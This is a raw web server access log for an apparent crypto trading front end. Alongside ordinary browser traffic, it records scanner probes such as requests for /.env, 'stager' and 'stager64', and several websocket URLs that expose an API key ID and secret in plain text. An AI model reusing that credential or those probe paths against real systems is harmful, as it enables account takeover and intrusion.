107.77.225.131 - - [22/Nov/2020:17:26:46 +0000] "GET /api/v1/instrument/active HTTP/1.1" 200 6688 "https://www.bogmex.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1"
107.77.225.131 - - [22/Nov/2020:17:26:46 +0000] "GET /service-worker.js HTTP/1.1" 200 1193 "https://www.bogmex.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1"
107.77.225.131 - - [22/Nov/2020:17:27:02 +0000] "GET /ws/?symbols=XBTUSD%2CXBTZ20%2CETHUSD%2CETHZ20%2CXBTH21&testnet=false&apiKeyID=ydVmW5XXZn8-aVXNN06hggvY&apiKeySecret=yrIIMpgqw-LH1jN444m6AUwq300r7h7oBUPHFPS1fGOkQCo0 HTTP/1.1" 101 164443 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1"
157.230.213.209 - - [22/Nov/2020:17:27:45 +0000] "GET /.env HTTP/1.1" 404 564 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
157.230.213.209 - - [22/Nov/2020:17:27:45 +0000] "POST / HTTP/1.1" 404 564 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
139.162.113.204 - - [22/Nov/2020:17:30:08 +0000] "GET / HTTP/1.1" 200 2154 "-" "HTTP Banner Detection (https://security.ipip.net)"
107.77.225.131 - - [22/Nov/2020:17:40:01 +0000] "GET /api/v1/apiKey HTTP/1.1" 200 291 "https://www.bogmex.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1"
107.77.225.131 - - [22/Nov/2020:17:40:01 +0000] "GET /api/v1/instrument/active HTTP/1.1" 200 6703 "https://www.bogmex.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1"
107.77.225.131 - - [22/Nov/2020:17:40:01 +0000] "GET /service-worker.js HTTP/1.1" 200 1193 "https://www.bogmex.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1"
107.77.225.131 - - [22/Nov/2020:17:40:58 +0000] "GET /ws/?symbols=XBTUSD%2CXBTZ20%2CETHUSD%2CETHZ20%2CXBTH21&testnet=false&apiKeyID=ydVmW5XXZn8-aVXNN06hggvY&apiKeySecret=yrIIMpgqw-LH1jN444m6AUwq300r7h7oBUPHFPS1fGOkQCo0 HTTP/1.1" 101 794528 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1"
107.77.225.131 - - [22/Nov/2020:17:43:29 +0000] "GET /ws/?symbols=XBTUSD%2CXBTZ20%2CETHUSD%2CETHZ20%2CXBTH21&testnet=false&apiKeyID=ydVmW5XXZn8-aVXNN06hggvY&apiKeySecret=yrIIMpgqw-LH1jN444m6AUwq300r7h7oBUPHFPS1fGOkQCo0 HTTP/1.1" 101 241921 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1"
156.96.61.147 - - [22/Nov/2020:18:08:13 +0000] "GET / HTTP/1.1" 200 2154 "-" "-"
193.174.89.19 - - [22/Nov/2020:18:17:39 +0000] "GET stager HTTP/1.1" 400 166 "-" "-"
193.174.89.19 - - [22/Nov/2020:18:17:39 +0000] "GET stager64 HTTP/1.1" 400 166 "-" "-"
193.174.89.19 - - [22/Nov/2020:18:17:39 +0000] "GET /connector.sds HTTP/1.1" 404 564 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
156.96.61.147 - - [22/Nov/2020:18:34:00 +0000] "GET / HTTP/1.1" 404 162 "-" "-"
73.255.217.90 - - [22/Nov/2020:18:41:57 +0000] "GET /api/v1/apiKey HTTP/1.1" 200 291 "https://www.bogmex.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
73.255.217.90 - - [22/Nov/2020:18:41:58 +0000] "GET /api/v1/instrument/active HTTP/1.1" 200 6723 "https://www.bogmex.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
73.255.217.90 - - [22/Nov/2020:18:41:58 +0000] "GET /service-worker.js HTTP/1.1" 200 1193 "https://www.bogmex.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
73.255.217.90 - - [22/Nov/2020:18:51:50 +0000] "GET /ws/?symbols=XBTUSD%2CXBTZ20%2CXBTH21&testnet=false&apiKeyID=ydVmW5XXZn8-aVXNN06hggvY&apiKeySecret=yrIIMpgqw-LH1jN444m6AUwq300r7h7oBUPHFPS1fGOkQCo0 HTTP/1.1" 101 4844339 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
73.255.217.90 - - [22/Nov/2020:18:51:52 +0000] "GET /ws/?symbols=XBTUSD%2CXBTZ20%2CXBTH21&testnet=false&apiKeyID=ydVmW5XXZn8-aVXNN06hggvY&apiKeySecret=yrIIMpgqw-LH1jN444m6AUwq300r7h7oBUPHFPS1fGOkQCo0 HTTP/1.1" 502 166 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
73.255.217.90 - - [22/Nov/2020:18:51:54 +0000] "GET /ws/?symbols=XBTUSD%2CXBTZ20%2CXBTH21&testnet=false&apiKeyID=ydVmW5XXZn8-aVXNN06hggvY&apiKeySecret=yrIIMpgqw-LH1jN444m6AUwq300r7h7oBUPHFPS1fGOkQCo0 HTTP/1.1" 502 166 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
73.255.217.90 - - [22/Nov/2020:18:51:55 +0000] "GET /ws/?symbols=XBTUSD%2CXBTZ20%2CXBTH21&testnet=false&apiKeyID=ydVmW5XXZn8-aVXNN06hggvY&apiKeySecret=yrIIMpgqw-LH1jN444m6AUwq300r7h7oBUPHFPS1fGOkQCo0 HTTP/1.1" 502 166 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
